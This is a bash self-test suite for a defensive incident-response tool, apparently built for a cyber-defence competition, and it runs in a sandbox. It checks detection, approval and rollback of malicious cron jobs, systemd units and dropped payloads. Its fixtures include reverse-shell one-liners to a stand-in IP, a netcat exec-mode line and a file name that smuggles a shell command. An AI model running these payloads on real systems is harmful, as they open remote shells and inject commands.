#!/usr/bin/env bash
set -u

# Non-destructive sentry regressions. A user-namespace sandbox supplies fake
# triage/watch helpers and disposable /etc persistence directories; no host
# account, cron file, unit, or systemd manager is changed.

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
pass=0
fail=0

ok() { pass=$((pass + 1)); printf 'ok %s - %s\n' "$pass" "$1"; }
not_ok() { fail=$((fail + 1)); printf 'not ok %s - %s\n' "$((pass + fail))" "$1"; }
assert_file() { [ -f "$1" ] && ok "$2" || not_ok "$2"; }
assert_absent() { [ ! -e "$1" ] && [ ! -L "$1" ] && ok "$2" || not_ok "$2"; }
assert_grep() { grep -qE "$1" "$2" 2>/dev/null && ok "$3" || not_ok "$3"; }

if ! command -v bwrap >/dev/null 2>&1; then
  printf 'SKIP: bwrap is required for sentry self-test\n'
  exit 77
fi

test_root=$(mktemp -d "${TMPDIR:-/tmp}/ccdc-sentry-test.XXXXXX") || exit 1
case "$test_root" in /tmp/ccdc-sentry-test.*|"${TMPDIR:-/tmp}"/ccdc-sentry-test.*) ;; *) printf 'unsafe temp path\n' >&2; exit 1 ;; esac
cleanup() { rm -rf -- "$test_root"; }
trap cleanup EXIT INT TERM HUP

mkdir -p "$test_root/suite/lib" "$test_root/state" "$test_root/cron" "$test_root/systemd" "$test_root/run" "$test_root/prompt-local" "$test_root/profile-d" "$test_root/bin"
: >"$test_root/null"
chmod 0666 "$test_root/null"
cp -- "$ROOT/linux/sentry.sh" "$test_root/suite/sentry.sh"
cp -- "$ROOT/linux/triage.sh" "$test_root/suite/real-triage.sh"
cp -- "$ROOT/linux/prompt.sh" "$test_root/suite/prompt.sh"
cp -- "$ROOT/linux/lib/common.sh" "$test_root/suite/lib/common.sh"
cp -- "$ROOT/linux/lib/provenance.sh" "$test_root/suite/lib/provenance.sh"
chmod 0755 "$test_root/suite/sentry.sh" "$test_root/suite/real-triage.sh" "$test_root/suite/prompt.sh"

cat >"$test_root/suite/triage.sh" <<'FAKE_TRIAGE'
#!/usr/bin/env bash
set -u
config=''
while [ "$#" -gt 0 ]; do
  case "$1" in --config) config=$2; shift 2 ;; --quiet) shift ;; *) exit 2 ;; esac
done
# shellcheck disable=SC1090
. "$config"
mode=$(cat "$CCDC_TEST_ROOT/mode")
out="$CCDC_EVIDENCE_DIR/triage.findings.$$"
case "$mode" in
  cron)
    printf 'RED|cron|/etc/cron.d/job;touch${IFS}PWNED|metacharacter filename\n' >"$out"
    ;;
  unit)
    printf 'RED|unit|/etc/systemd/system/evil.service|test unit\n' >"$out"
    ;;
  unitheld)
    printf 'RED|unit|/etc/systemd/system/evil.service|test unit\n' >"$out"
    printf 'RED|rogueuser|rtsvc|account not in CCDC_ALLOWED_USERS can log in\n' >>"$out"
    ;;
  reviewed_one)
    printf 'RED|cron|/etc/cron.d/reviewed-old|reviewed item\n' >"$out"
    ;;
  reordered)
    printf 'RED|cron|/etc/cron.d/unreviewed-new|new item inserted first\n' >"$out"
    printf 'RED|cron|/etc/cron.d/reviewed-old|reviewed item moved to position two\n' >>"$out"
    ;;
  dropins)
    printf 'RED|unitdropin|scored.service::/etc/systemd/system/scored.service.d/direct.conf|direct malicious drop-in\n' >"$out"
    printf 'RED|unitdropindeep|scored.service::/etc/systemd/system/scored.service.d/deep.conf::%s/deep-payload.sh|deep malicious drop-in\n' "$CCDC_TEST_ROOT" >>"$out"
    ;;
  clean)
    : >"$out"
    ;;
  amber)
    printf 'AMBER|rogueunit|/etc/systemd/system/amber.service|reversible test unit\n' >"$out"
    ;;
  dropfile)
    printf 'RED|dropfile|%s/dropped/.payload|a hidden program\n' "$CCDC_TEST_ROOT" >"$out"
    ;;
  fail)
    exit 9
    ;;
  *) exit 8 ;;
esac
mv "$out" "$CCDC_EVIDENCE_DIR/triage.findings"
[ "$mode" = clean ] && exit 0
exit 3
FAKE_TRIAGE

cat >"$test_root/suite/watch.sh" <<'FAKE_WATCH'
#!/usr/bin/env bash
[ -n "${CCDC_TEST_ROOT:-}" ] && printf 'watch ran\n' >>"$CCDC_TEST_ROOT/watch-runs"
exit 0
FAKE_WATCH
chmod 0755 "$test_root/suite/triage.sh" "$test_root/suite/watch.sh"

cat >"$test_root/bin/timeout" <<'FAKE_TIMEOUT'
#!/usr/bin/env bash
limit=$1
shift
[ -n "${CCDC_TEST_ROOT:-}" ] && printf '%s|%s\n' "$limit" "${1##*/}" >>"$CCDC_TEST_ROOT/timeout-calls"
exec "$@"
FAKE_TIMEOUT
chmod 0755 "$test_root/bin/timeout"

cat >"$test_root/runner.sh" <<'RUNNER'
#!/usr/bin/env bash
set -u
test_root=$1
suite="$test_root/suite"
state="$test_root/state"
config="$test_root/test.env"
prompt="$suite/prompt.sh"
PATH="$test_root/bin:$PATH"
export PATH
pass=0
fail=0
ok() { pass=$((pass + 1)); printf 'ok %s - %s\n' "$pass" "$1"; }
bad() { fail=$((fail + 1)); printf 'not ok %s - %s\n' "$((pass + fail))" "$1"; }
has() { grep -qE "$1" "$2" 2>/dev/null && ok "$3" || bad "$3"; }

write_config() {
  services=$1
  cat >"$config" <<EOF
CCDC_BOX_NAME="self-test"
CCDC_EVIDENCE_DIR="$state"
CCDC_ALLOWED_USERS="root"
CCDC_SYSTEMD_SERVICES="$services"
CCDC_SENTRY_INTERVAL="20"
CCDC_WATCH_INTERVAL="30"
CCDC_TEST_ROOT="$test_root"
EOF
}

# A path that would create PWNED if reconstructed and sent through sh -c.
printf 'payload\n' >'/etc/cron.d/job;touch${IFS}PWNED'
printf 'cron\n' >"$test_root/mode"
write_config ssh
cd "$test_root" || exit 1
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]cron[|]/etc/cron.d/job;touch[$][{]IFS[}]PWNED$' "$state/sentry.queue" \
  'queue stores structured fields, not a command'
has '^[0-9]+[|]0[|][0-9]+$' "$test_root/run/ccdc-sentry-prompt" \
  'RED-only queue publishes a zero pending-AMBER prompt count'

# The indicator changes two profile-owned files only when an operator asks for
# it. Exercise the real root-gated install and uninstall inside this namespace,
# whose /usr/local/lib and /etc/profile.d are disposable bindings.
if "$prompt" --config "$config" --install --apply >/dev/null \
   && [ -f /usr/local/lib/ccdc-prompt/prompt-hook.sh ] \
   && [ -f /etc/profile.d/99-ccdc-prompt.sh ] \
   && grep -qxF '# CCDC_PROMPT_HOOK v1' /usr/local/lib/ccdc-prompt/prompt-hook.sh; then
  ok 'prompt install creates exactly its marked hook and profile entry'
else
  bad 'prompt install creates exactly its marked hook and profile entry'
fi
if "$prompt" --config "$config" --uninstall --apply >/dev/null \
   && [ ! -e /usr/local/lib/ccdc-prompt/prompt-hook.sh ] \
   && [ ! -e /etc/profile.d/99-ccdc-prompt.sh ]; then
  ok 'prompt uninstall removes its owned files again'
else
  bad 'prompt uninstall removes its owned files again'
fi
"$suite/sentry.sh" --config "$config" --status >/dev/null
if "$suite/sentry.sh" --config "$config" --approve --apply >/dev/null; then
  ok 'metacharacter-path approval completed'
else
  bad 'metacharacter-path approval completed'
fi
[ ! -e '/etc/cron.d/job;touch${IFS}PWNED' ] && ok 'exact malicious filename removed' || bad 'exact malicious filename removed'
[ ! -e "$test_root/PWNED" ] && ok 'shell metacharacters were never evaluated' || bad 'shell metacharacters were never evaluated'
has '[|]cron[|]/etc/cron.d/job;touch[$][{]IFS[}]PWNED[|]' "$state/sentry.undo" \
  'approval record names structured subject and evidence'

# AMBER entries need an individual sign-off, but the prompt must say that one
# is waiting. Use a reversible unit shape so can_automate legitimately queues
# it rather than inflating the count with a held finding.
printf '[Service]\nExecStart=/bin/false\n' >'/etc/systemd/system/amber.service'
printf 'amber\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^[0-9]+[|]1[|][0-9]+$' "$test_root/run/ccdc-sentry-prompt" \
  'one actionable AMBER item publishes prompt count one'

# A queue made under the old config must be rebuilt under the new protection
# list before approval. The fake triage continues to report the same unit.
printf '[Service]\nExecStart=/bin/false\n' >'/etc/systemd/system/evil.service'
printf 'unit\n' >"$test_root/mode"
write_config ssh
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]unit[|]/etc/systemd/system/evil.service$' "$state/sentry.queue" \
  'unprotected current unit queued'
# The default screen is the short one: the item, what approving it does, and
# the commands - not the 270-line report that hid its only RED on line 19.
printf 'unitheld\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
"$suite/sentry.sh" --config "$config" --status --full >"$test_root/status-full.out"
"$suite/sentry.sh" --config "$config" --status >"$test_root/status-brief.out"
if grep -qE '^  \[1\] RED +unit +/etc/systemd/system/evil.service$' "$test_root/status-brief.out" \
   && grep -q 'will: ' "$test_root/status-brief.out" \
   && grep -q -- '--approve --apply' "$test_root/status-brief.out" \
   && grep -qE '^  RED +rogueuser +rtsvc$' "$test_root/status-brief.out" \
   && grep -qF 'not yours: sudo usermod -L -e 1 -s /usr/sbin/nologin rtsvc' "$test_root/status-brief.out" \
   && ! grep -q 'more:  playbooks' "$test_root/status-brief.out" \
   && grep -q 'more:  playbooks' "$test_root/status-full.out" \
   && [ "$(wc -l <"$test_root/status-brief.out")" -lt "$(wc -l <"$test_root/status-full.out")" ]; then
  ok 'status is one line per item by default; --full keeps every explanation'
else
  bad 'status is one line per item by default; --full keeps every explanation'
fi
# --status re-checks before it prints. Measured live: an account locked
# seconds earlier was still listed RED, because the list was the loop's.
printf 'unit\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --status >"$test_root/status-fresh.out"
if ! grep -q 'rogueuser' "$test_root/status-fresh.out" \
   && grep -qE '^  \[1\] RED +unit ' "$test_root/status-fresh.out"; then
  ok 'status re-runs triage, so a finding fixed a second ago is already gone'
else
  bad 'status re-runs triage, so a finding fixed a second ago is already gone'
fi
write_config 'ssh evil.service'
if "$suite/sentry.sh" --config "$config" --approve --apply >"$test_root/stale.out"; then
  ok 'approval refresh accepted changed protection config'
else
  bad 'approval refresh accepted changed protection config'
fi
[ -f /etc/systemd/system/evil.service ] && ok 'newly protected unit was not removed' || bad 'newly protected unit was not removed'
[ ! -s "$state/sentry.queue" ] && ok 'stale queue entry was discarded' || bad 'stale queue entry was discarded'

# Findings that disappear leave seen, and therefore queue again if they return.
printf 'clean\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
write_config ssh
printf 'unit\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]unit[|]/etc/systemd/system/evil.service$' "$state/sentry.queue" \
  'disappeared finding queues again when it returns'

# Numeric approval is bound to what --status showed, not to a freshly
# re-numbered queue. Insert a new item ahead of reviewed item 1 before approve.
printf 'old\n' >'/etc/cron.d/reviewed-old'
printf 'new\n' >'/etc/cron.d/unreviewed-new'
printf 'reviewed_one\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
"$suite/sentry.sh" --config "$config" --status >"$test_root/reviewed.out"
has 'Reviewed approval snapshot frozen' "$test_root/reviewed.out" \
  'status freezes the queue identity the operator reviewed'
printf 'reordered\n' >"$test_root/mode"
if "$suite/sentry.sh" --config "$config" --approve 1 --apply >/dev/null; then
  ok 'approval survives live queue reordering'
else
  bad 'approval survives live queue reordering'
fi
[ ! -e /etc/cron.d/reviewed-old ] && ok 'approved identity was removed' || bad 'approved identity was removed'
[ -e /etc/cron.d/unreviewed-new ] && ok 'new unreviewed item was not substituted' || bad 'new unreviewed item was not substituted'

# A protected/scored service must protect its legitimate unit, not an injected
# drop-in attached to it. Exercise both direct malicious content and a clean
# drop-in that points one hop down to the payload.
mkdir -p /etc/systemd/system/scored.service.d
printf '[Service]\nExecStartPost=/bin/bash -c "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"\n' \
  >/etc/systemd/system/scored.service.d/direct.conf
printf '[Service]\nExecStartPost=%s/deep-payload.sh\n' "$test_root" \
  >/etc/systemd/system/scored.service.d/deep.conf
printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' >"$test_root/deep-payload.sh"
chmod 0755 "$test_root/deep-payload.sh"
printf '[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"\n' \
  >'/etc/systemd/system/evil;touch_PWNED.service'
write_config 'ssh scored.service'
"$suite/real-triage.sh" --config "$config" --quiet \
  --findings-file "$state/dropin.findings" >"$test_root/real-triage.out" || triage_rc=$?
[ "${triage_rc:-0}" -eq 3 ] && ok 'real triage reports malicious drop-ins' || bad 'real triage reports malicious drop-ins'
has '^RED[|]unitdropin[|]scored.service::/etc/systemd/system/scored.service.d/direct.conf[|]' \
  "$state/dropin.findings" 'direct drop-in gets its own machine finding'
has '^RED[|]unitdropindeep[|]scored.service::/etc/systemd/system/scored.service.d/deep.conf::.*deep-payload.sh[|]' \
  "$state/dropin.findings" 'clean drop-in is followed one hop to its payload'
has 'evil\\;touch_PWNED.service' "$test_root/real-triage.out" \
  'paste-ready unit commands shell-quote an attacker-controlled filename'
printf 'dropins\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]unitdropin[|]scored.service::/etc/systemd/system/scored.service.d/direct.conf$' \
  "$state/sentry.queue" 'scored unit protection does not shield a malicious drop-in'
has '^RED[|]unitdropindeep[|]scored.service::/etc/systemd/system/scored.service.d/deep.conf::.*deep-payload.sh$' \
  "$state/sentry.queue" 'deep drop-in remediation reaches the approval queue'

# A payload left on disk after what launched it was cleaned up: approving it
# moves it into the evidence case - gone from where it was, kept.
mkdir -p "$test_root/dropped"
printf '#!/bin/sh\n: RT\n' >"$test_root/dropped/.payload"
chmod 0755 "$test_root/dropped/.payload"
printf 'dropfile\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
"$suite/sentry.sh" --config "$config" --status >/dev/null
"$suite/sentry.sh" --config "$config" --approve 1 --apply >"$test_root/dropfile.out" 2>&1
if [ ! -e "$test_root/dropped/.payload" ] \
   && ls "$state"/removed/*dropfile*/*.payload >/dev/null 2>&1; then
  ok 'approving a dropped file removes it and keeps it in the evidence case'
else
  bad 'approving a dropped file removes it and keeps it in the evidence case'
fi

# A dead supervisor must not leave an old calm-looking ALERTS file as the only
# output of --status. Age the completion marker and require a loud warning.
touch -t 200001010000 "$state/sentry.last-pass"
"$suite/sentry.sh" --config "$config" --status >"$test_root/stale-status.out"
has '^WARNING: last sentry pass is .* old' "$test_root/stale-status.out" \
  'status calls out a stale supervisor report'

# Detector failure must clear actions and become an explicit health alarm.
printf 'fail\n' >"$test_root/mode"
rm -f "$state/sentry.watch.last"
watch_before=$(wc -l <"$test_root/watch-runs" 2>/dev/null || printf 0)
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
[ ! -s "$state/sentry.queue" ] && ok 'triage failure clears actionable queue' || bad 'triage failure clears actionable queue'
has 'MONITOR HEALTH PROBLEM' "$state/ALERTS" 'triage failure is visible in ALERTS'
has 'exit 9' "$state/sentry.health.triage" 'triage failure records exit status'
has '^[0-9]+[|][?][|][0-9]+$' "$test_root/run/ccdc-sentry-prompt" \
  'triage failure publishes an unknown prompt state'
watch_after=$(wc -l <"$test_root/watch-runs" 2>/dev/null || printf 0)
[ "$watch_after" -gt "$watch_before" ] && ok 'triage failure does not suppress the independent watch layer' || bad 'triage failure does not suppress the independent watch layer'
has '^45[|]triage.sh$' "$test_root/timeout-calls" 'triage runs behind its configured deadline'
has '^90[|]watch.sh$' "$test_root/timeout-calls" 'watch runs behind its configured deadline'

printf 'sentry self-test: %s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
RUNNER
chmod 0755 "$test_root/runner.sh"

if ! bwrap --die-with-parent --unshare-user --uid 0 --gid 0 --unshare-pid \
    --proc /proc --dev-bind /dev /dev --ro-bind / / \
    --bind "$test_root" "$test_root" \
    --bind "$test_root/null" /dev/null \
    --bind "$test_root/cron" /etc/cron.d \
    --bind "$test_root/systemd" /etc/systemd/system \
    --bind "$test_root/run" /run \
    --bind "$test_root/prompt-local" /usr/local/lib \
    --bind "$test_root/profile-d" /etc/profile.d \
    /bin/bash "$test_root/runner.sh" "$test_root"; then
  printf 'sentry self-test failed\n' >&2
  [ ! -f "$test_root/state/sentry.log" ] || tail -n 30 "$test_root/state/sentry.log" >&2
  exit 1
fi

# --- source-level guarantees, on the host ------------------------------------
#
# These read the scripts rather than run them, so they belong out here: inside
# the sandbox $ROOT is not set and they silently did nothing while making the
# whole suite exit non-zero.
hpass=0; hfail=0
hok() { hpass=$((hpass + 1)); printf 'ok - %s\n' "$1"; }
hno() { hfail=$((hfail + 1)); printf 'not ok - %s\n' "$1"; }

# --- every check triage can emit must be answered by sentry --------------------
#
# This is the finish-line guarantee, and it is the one that was missing. Sentry
# printed one line - "held: this finding needs judgement or is not safely
# automatable" - under every finding it would not act on, regardless of what the
# finding was. Detection was thorough and then the tool went quiet at the exact
# moment the operator needed it.
#
# So: every check type triage emits must be EITHER actionable by sentry, or have
# written guidance in held_reason that says what to compare and what to run.
gap=$(python3 - "$ROOT" <<'SCAN'
import re, sys, os
root = sys.argv[1]
triage = open(os.path.join(root, 'linux', 'triage.sh'), encoding='utf-8').read()
sentry = open(os.path.join(root, 'linux', 'sentry.sh'), encoding='utf-8').read()

emitted = set(re.findall(r'emit\s+\w+\s+([a-z0-9]+)\s', triage))

def arms(src, fn):
    m = re.search(r'\n' + fn + r'\(\) \{(.*?)\n\}\n', src, re.S)
    if not m:
        return set()
    out = set()
    for line in m.group(1).splitlines():
        mm = re.match(r'^\s*([a-z0-9|]+)\)', line)
        if mm:
            for part in mm.group(1).split('|'):
                if part and part != '*':
                    out.add(part)
    return out

answered = arms(sentry, 'actionable') | arms(sentry, 'held_reason') | arms(sentry, 'render_action')
print(' '.join(sorted(k for k in emitted if k not in answered)))
SCAN
)
if [ -z "$gap" ]; then
  hok 'every check triage emits is either actionable or has written guidance'
else
  hno "checks with no action and no written reason:$gap"
fi

# The generic line must not be the answer for anything real.
if grep -q 'this finding needs judgement or is not safely automatable' "$ROOT/linux/sentry.sh"; then
  hno 'the generic "needs judgement" boilerplate is still printed'
else
  hok 'the generic "needs judgement" boilerplate is gone'
fi

# Guidance has to hand over a command, not a path. A path cannot be pasted.
if awk '/^held_reason\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -qE 'sudo |diff |grep '; then
  hok 'the guidance hands over commands, not bare paths'
else
  hno 'the guidance names files without saying how to open them'
fi

# Never by list position: the list re-sorts between reading and acting.
if awk '/^held_reason\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -qE '\-\-key [ab]\b'; then
  hno 'a destructive command identifies its target by position in a list'
else
  hok 'destructive commands name their target, never a row letter'
fi


# Every item carries a card reference - approvable or not, and ESPECIALLY the
# ones that need a human, because those are where the operator has to decide and
# a reference is the difference between deciding and guessing.
refs=$(grep -c "more:  playbooks/remediation-cards.md" "$ROOT/linux/sentry.sh" || true)
if [ "$refs" -ge 3 ]; then
  hok 'approvable, held and amber items all print a card reference'
else
  hno "only $refs of the three render paths print a card reference"
fi

# A reference that points at the wrong card costs a page-turn to discover.
# sshrootlogin/sshemptypw had NO card and were pointed at CARD 8, which is
# listening ports.
missing=$(python3 - "$ROOT" <<'SCAN'
import re, sys, os
root = sys.argv[1]
cards = set(re.findall(r'^## CARD (\d+)', open(os.path.join(root,'playbooks','remediation-cards.md'),
            encoding='utf-8').read(), re.M))
src = open(os.path.join(root,'linux','sentry.sh'), encoding='utf-8').read()
m = re.search(r'\ncard_for\(\) \{(.*?)\n\}\n', src, re.S)
named = set(re.findall(r"CARD (\d+)", m.group(1) if m else ''))
print(' '.join(sorted(named - cards)))
SCAN
)
if [ -z "$missing" ]; then
  hok 'every card sentry names actually exists in the playbook'
else
  hno "sentry points at cards that do not exist: $missing"
fi

# The three lists that have to agree, and silently did not.
#
# Five actions were written, dispatched by execute_action, and unreachable:
# can_automate had no arm for any of them, so the queue never held one and
# --approve never routed to one. They were dead code that read like a feature.
# The same gap in render_action prints "no automatic action" as the `will:`
# line directly above an approve command - a line that contradicts itself.
#
# So: every check execute_action can run must be one can_automate can accept
# and render_action can describe, and nothing can_automate accepts may be
# undispatchable. Checked against the source, because the alternative is
# noticing on the box during an event.
mismatch=$(python3 - "$ROOT" <<'PARITY'
import re, sys, os
src = open(os.path.join(sys.argv[1], 'linux', 'sentry.sh'), encoding='utf-8').read()

def arms(fn):
    m = re.search(r'\n%s\(\) \{\n(.*?)\n\}\n' % fn, src, re.S)
    if not m:
        return None
    found = set()
    for label in re.findall(r'^ {4}([A-Za-z0-9_*|]+)\)', m.group(1), re.M):
        found.update(p for p in label.split('|') if p != '*')
    return found

execs = arms('execute_action')
auto  = arms('can_automate')
rend  = arms('render_action')
problems = []
for name, got in (('execute_action', execs), ('can_automate', auto), ('render_action', rend)):
    if got is None:
        problems.append('cannot find %s' % name)
if not problems:
    # can_automate lists rcdeep|rcfile as an explicit refusal, not an offer.
    refused = set(re.findall(r'^ {4}([A-Za-z0-9_|]+)\) return 1 ;;',
                  re.search(r'\ncan_automate\(\) \{\n(.*?)\n\}\n', src, re.S).group(1), re.M))
    refused = {p for label in refused for p in label.split('|')}
    offered = auto - refused
    for k in sorted(offered - execs):
        problems.append('can_automate offers %s but execute_action cannot run it' % k)
    for k in sorted(offered - rend):
        problems.append('%s has no render_action arm, so its will: line reads "no automatic action"' % k)
    for k in sorted(execs - auto):
        problems.append('execute_action runs %s but can_automate never accepts it: dead code' % k)
print('; '.join(problems))
PARITY
)
if [ -z "$mismatch" ]; then
  hok 'can_automate, render_action and execute_action all cover the same checks'
else
  hno "$mismatch"
fi

# An AMBER action stops a port or kills a process. A bulk approve that took
# those would be the self-inflicted outage the kit exists to prevent.
if awk '/^do_approve\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q 'NOT APPLIED by a bulk approve'; then
  hok 'a bulk --approve refuses AMBER items and hands over their numbers'
else
  hno 'a bulk --approve would sweep AMBER items, which may be the scored service'
fi

# Nothing may kill a pid without asking a second time, immediately before the
# kill: the queue can be a minute old and pids are recycled.
if awk '/^action_live_process\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q 'pid_is_protected'; then
  hok 'the live-process action re-checks protection immediately before killing'
else
  hno 'the live-process action trusts a queue decision made up to a minute ago'
fi

# A rollback decision that only looks at TCP calls a 500-ing web service healthy.
if awk '/^scored_still_answering\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q 'ccdc_http_checks'; then
  hok 'the scored re-check asks the HTTP checks, not just the TCP handshake'
else
  hno 'the scored re-check never asks whether the web service actually serves'
fi

# Queueing AMBER made the numbered list and the NEEDS YOU list overlap for the
# first time, and the operator saw the same finding twice: once with an approve
# command, once under a heading saying it needed them.
if awk '/^write_alerts\(\)/,/^}/' "$ROOT/linux/sentry.sh" \
   | grep -c 'queue_has "$check" "$subject" && continue' | grep -qx 2; then
  hok 'neither held list reprints a finding that already has its own number'
else
  hno 'a queued finding is printed again under RED-held or NEEDS YOU'
fi

# Anything offerable at AMBER must be something can_automate can actually vet.
gap=$(python3 - "$ROOT" <<'AMBER'
import re, sys, os
src = open(os.path.join(sys.argv[1], 'linux', 'sentry.sh'), encoding='utf-8').read()
m = re.search(r'\nofferable_at_amber\(\) \{\n(.*?)\n\}\n', src, re.S)
amber = set()
for label in re.findall(r'^ {4}([A-Za-z0-9_|]+)\) return 0 ;;', m.group(1) if m else '', re.M):
    amber.update(label.split('|'))
c = re.search(r'\ncan_automate\(\) \{\n(.*?)\n\}\n', src, re.S).group(1)
auto = set()
for label in re.findall(r'^ {4}([A-Za-z0-9_*|]+)\)', c, re.M):
    auto.update(p for p in label.split('|') if p != '*')
print(' '.join(sorted(amber - auto)))
AMBER
)
if [ -z "$gap" ]; then
  hok 'every check offerable at AMBER is one can_automate vets'
else
  hno "offerable at AMBER but can_automate never sees it: $gap"
fi

# A rollback that reconstructs the preserved path by hand gets it wrong: the
# copy is written with a sequence number in front of the basename, and without
# it the cp finds nothing. Both rollbacks did this, and both sent the error to
# /dev/null - so the report said FAILED while the unit file stayed deleted.
if awk '/^action_/,/^}/' "$ROOT/linux/sentry.sh" \
   | grep -qE 'cp -a -- "\$evidence_case/'; then
  hno 'a rollback rebuilds the preserved path by hand instead of using restore_from_case'
else
  hok 'rollbacks restore through restore_from_case, not a hand-built path'
fi

# And the round trip itself, run for real rather than read.
rt=$(bash -c '
  set -u
  slog() { :; }
  evidence_case=$(mktemp -d); evidence_copy_seq=0; evidence_last=""
  '"$(awk '/^preserve_into_case\(\) \{/,/^}/' "$ROOT/linux/sentry.sh")"'
  '"$(awk '/^restore_from_case\(\) \{/,/^}/' "$ROOT/linux/sentry.sh")"'
  src=$(mktemp); printf "the original contents\n" >"$src"
  preserve_into_case "$src" || { echo "preserve failed"; exit 1; }
  saved=$evidence_last
  rm -f -- "$src"
  restore_from_case "$saved" "$src" || { echo "restore reported failure"; exit 1; }
  [ -f "$src" ] || { echo "restore did not put the file back"; exit 1; }
  grep -qx "the original contents" "$src" || { echo "restored contents differ"; exit 1; }
  # And it must refuse, loudly, when there is no copy to restore from.
  if restore_from_case "" "$src" 2>/dev/null; then echo "restore claimed success with no saved copy"; exit 1; fi
  rm -rf -- "$evidence_case" "$src"
  echo ok
' 2>&1 | tail -1)
if [ "$rt" = ok ]; then
  hok 'preserve then restore puts the original file back, byte for byte'
else
  hno "preserve/restore round trip: $rt"
fi

# A common lab health probe is `nc -z 127.0.0.1 PORT`.  It does not execute a
# shell, while netcat's explicit exec modes do.  Keep the shared triage pattern
# honest because cron, units and one-hop payloads all use it.
cron_shells=$(awk -F"'" '/^shells=/{ print $2; exit }' "$ROOT/linux/triage.sh")
if printf '%s\n' 'exec /usr/bin/nc -z 127.0.0.1 8080' | grep -qE "$cron_shells"; then
  hno 'netcat zero-I/O health probes are not called reverse shells'
else
  hok 'netcat zero-I/O health probes are not called reverse shells'
fi
if printf '%s\n' 'nc -l -p 4444 -e /bin/sh' | grep -qE "$cron_shells"; then
  hok 'netcat exec-mode payloads remain reverse-shell findings'
else
  hno 'netcat exec-mode payloads were lost from reverse-shell findings'
fi

# Service identities belong in the protected account list, but many are
# intentionally nologin. Availability checks and their restorative action must
# be limited to the separately declared interactive-login set.
interactive_block=$(sed -n '/# --- 1b\. Scored accounts/,/# --- 2\. Accounts/p' "$ROOT/linux/triage.sh")
if grep -q 'CCDC_INTERACTIVE_USERS' <<<"$interactive_block" \
   && ! grep -q 'for u in \${CCDC_ALLOWED_USERS' <<<"$interactive_block"; then
  hok 'only explicitly interactive accounts are checked for login availability'
else
  hno 'allowed service identities are still treated as interactive scored users'
fi
scored_guard=$(awk '/^[[:space:]]*scoreduser\)/,/^[[:space:]]*;;/' "$ROOT/linux/sentry.sh")
scored_action=$(awk '/^action_scoreduser\(\) \{/,/^}/' "$ROOT/linux/sentry.sh")
if grep -q 'CCDC_INTERACTIVE_USERS' <<<"$scored_guard"$'\n'"$scored_action"; then
  hok 'scored-user remediation also requires explicit interactive-login intent'
else
  hno 'scored-user remediation can unlock a protected service identity'
fi

# The action keeps forensic bytes but must not leave a second SUID escalation
# primitive in its own evidence directory, or the next sweep flags the cure.
if awk '/^action_suidunpackaged\(\)/,/^}/' "$ROOT/linux/sentry.sh" \
   | grep -q 'chmod u-s,g-s -- "\$saved"' \
   && awk '/^action_suidunpackaged\(\)/,/^}/' "$ROOT/linux/sentry.sh" \
      | grep -q '00-original-metadata.txt'; then
  hok 'SUID remediation records original metadata and defangs its evidence copy'
else
  hno 'SUID remediation leaves a potentially active evidence copy or loses its original mode'
fi

# Removing a unit can take the scored service with it, whichever detector
# named the unit first. The same file must not have two different safety
# levels depending on whether it was reported as `unit` or as `rogueunit`.
gap=$(for fn in action_unit action_unitdeep action_rogueunit action_port_common; do
  sed -n "/^$fn() {/,/^}/p" "$ROOT/linux/sentry.sh" \
    | grep -q scored_still_answering || printf ' %s' "$fn"
done)
if [ -z "$gap" ]; then
  hok 'every action that can stop a unit re-checks the scored services'
else
  hno "removes or stops a unit with nothing watching:$gap"
fi

# A pid holding a port the packet or the watchdog accounts for is as protected
# as the port is: killing the process closes the port just the same.
if awk '/^pid_is_protected\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q pid_holds_protected_port; then
  hok 'a process holding a scored port is protected from the live-process actions'
else
  hno 'a live-process action can kill the holder of a port the watchdog probes'
fi

# The worst thing this kit has done to a box: approving a netprocsvc finding
# for a python web shell deleted /usr/bin/python3.12, the interpreter the
# SCORED service runs on. Killing a process and deleting its executable are
# two different decisions, and only the second is about provenance.
if sed -n '/^action_live_process() {/,/^}/p' "$ROOT/linux/sentry.sh" \
   | grep -B4 'rm -f -- "$path"' | grep -q exe_is_unpackaged; then
  hok 'an executable is only deleted when no package owns it'
else
  hno 'a live-process action can delete a shared, package-owned interpreter'
fi

# And the will: line must not promise a deletion that will not happen, or one
# that must not happen.
if sed -n '/^render_action() {/,/^}/p' "$ROOT/linux/sentry.sh" | grep -q 'so the file STAYS'; then
  hok 'the will: line says whether the executable is deleted or kept'
else
  hno 'the will: line promises "delete the executable" whatever the file is'
fi

# Exactly one check may skip the protected-port test, and only because it
# substitutes a stricter one. An exemption left without its compensating
# control is worse than no exemption.
mode_fn=$(sed -n '/^protection_mode_for() {/,/^}/p' "$ROOT/linux/sentry.sh")
arm=$(sed -n '/^can_automate() {/,/^}/p' "$ROOT/linux/sentry.sh" \
      | sed -n '/^    netprocsvc)/,/;;/p')
if [ "$(printf '%s' "$mode_fn" | grep -c 'ignore-port')" = 1 ] \
